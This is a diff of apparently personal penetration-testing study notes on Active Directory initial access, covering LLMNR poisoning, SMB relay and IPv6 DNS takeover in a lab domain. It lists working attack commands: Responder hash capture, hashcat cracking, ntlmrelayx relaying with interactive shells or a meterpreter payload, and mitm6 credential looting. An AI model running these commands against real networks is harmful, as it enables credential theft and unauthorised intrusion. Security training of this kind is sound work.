@@ -1,4 +1,5 @@
-# LLMNR Poisoning
+# Initial Attack Vector
+### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
  - Previously known as  NBT-NS.
  - Used to identify hosts when DNS fails.
@@ -12,7 +13,7 @@
  - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv`
  - `hashcat -m 5600 hash.txt rockyou.txt`
 
-# SMB relay
+### SMB relay
  - Instead of cracking hash, just pass in the hash directly.
  - To find devices with smbsigning disabled `nmap --script=smb2-security-mode.nse -p445 <network>/24`.
  - Usually servers have smb signing enabled and required, but hosts will have smb signing enabled but not required.
@@ -22,7 +23,21 @@
  - For newer kali `impacket-ntlmrelayx -tf targets.txt -smb2support`
  - `-i` to get interactive smb shell, `-e meterpreter.exe`
 
-## IPv6 attack
+### IPv6 attack
  - A system has IPv6 configured, DNS for it is usually not configured, an attacker claims itself to be DNS server for IPv6, and when victim queries it, it will get creds as well.
  - `mitm6 -d MARVEL.local` to listen
  - `ntlmrelayx.py -6 -t ldaps://<AD_IP> -wh fakewpad.ldap.local -l lootme`
+ - Soln: disable IPv, ...
+ - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ 
+ - https://github.com/fortra/impacket/releases 
+ 
+### Others
+ - Nessus, nmap scan.
+ - Look for websites within the scopes.
+ - metasploit http_version module.
+ - (Pass Back Attack) Printer stuffs https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
+ - Jenkins instances.
+ - Thinking outside the box? 
+ - Other open ports?
+
+# Post Compromise Enumeration
